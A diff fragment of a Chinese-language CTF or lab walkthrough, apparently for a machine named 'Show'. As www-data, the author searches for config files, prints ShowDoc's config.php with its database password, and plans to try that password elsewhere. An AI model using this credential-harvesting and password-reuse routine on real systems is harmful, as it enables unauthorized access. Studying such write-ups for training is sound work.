@@ -112,4 +112,68 @@ PS D:\webtool\Dirsearch> curl http://10.241.108.8:8080/showdoc.db.php -O "showdo
 ![](file-20260428181149330.png)
 打开能看到我自己的用户和一个showdoc目录，但是可惜密码是哈希加密的，cmd5也没爆出来
 只能继续去找了，我们找一找配置文件
+```zsh
+www-data@Show:~/html$ find . -name "*conf*"   
+find . -name "*conf*"
+./web_src/test/e2e/nightwatch.conf.js
+./web_src/test/unit/jest.conf.js
+./web_src/build/webpack.base.conf.js
+./web_src/build/webpack.prod.conf.js
+./web_src/build/webpack.dev.conf.js
+./web_src/build/vue-loader.conf.js
+./web_src/config
+./web_src/.editorconfig
+./server/Application/Common/Conf/config.php
+./server/Application/Api/Conf/config.php
+./server/Application/Home/Conf/config.php
 
+```
+先看的几个php文件。
+```php
+www-data@Show:~/html$ cat server/Application/Common/Conf/config.php
+cat server/Application/Common/Conf/config.php
+<?php
+return array(
+    //'配置项'=>'配置值'
+    //使用sqlite数据库
+    'DB_TYPE'   => 'Sqlite', 
+    'DB_NAME'   => '../Sqlite/showdoc.db.php', 
+    //showdoc不再支持mysql http://www.showdoc.cc/help?page_id=31990
+    'DB_HOST'   => 'localhost',
+    'DB_USER'   => 'showdoc', 
+    'DB_PWD'    => 'showdoc123456',
+    'DB_PORT'   => 3306, // 端口
+    'DB_PREFIX' => '', // 数据库表前缀
+    'DB_CHARSET'=> 'utf8', // 字符集
+    'DB_DEBUG'  =>  TRUE, // 数据库调试模式 开启后可以记录SQL日志
+    'URL_HTML_SUFFIX' => '',//url伪静态后缀
+    'URL_MODEL' => 3 ,//URL兼容模式
+    'URL_ROUTER_ON'   => true, 
+    'URL_ROUTE_RULES'=>array(
+        ':id\d'               => 'Home/Item/show?item_id=:1',
+        ':domain\s$'               => 'Home/Item/show?item_domain=:1',//item的个性域名
+        'uid/:id\d'               => 'Home/Item/showByUid?uid=:1',
+        'page/:id\d'               => 'Home/Page/single?page_id=:1',
+    ),
+    'URL_CASE_INSENSITIVE'=>true,
+    'SHOW_ERROR_MSG'        =>  true,    // 显示错误信息，这样在部署模式下也能显示错误
+    'STATS_CODE' =>'',  //可选，统计代码
+    'TMPL_CACHE_ON' => false,//禁止模板编译缓存
+    'HTML_CACHE_ON' => false,//禁止静态缓存
+    'TMPL_EXCEPTION_FILE' => '../Public/exception.tpl' , //错误模版
+    //上传文件到七牛的配置
+    'UPLOAD_SITEIMG_QINIU' => array(
+                    'maxSize' => 5 * 1024 * 1024,//文件大小
+                    'rootPath' => './',
+                    'saveName' => array ('uniqid', ''),
+                    'driver' => 'Qiniu',
+                    'driverConfig' => array (
+                            'secrectKey' => '', 
+                            'accessKey' => '',
+                            'domain' => '',
+                            'bucket' => '', 
+                        )
+                    ),
+);
+```
+直接发现了showdoc用户的密码。我们尝试一下，看是否存在密码复用
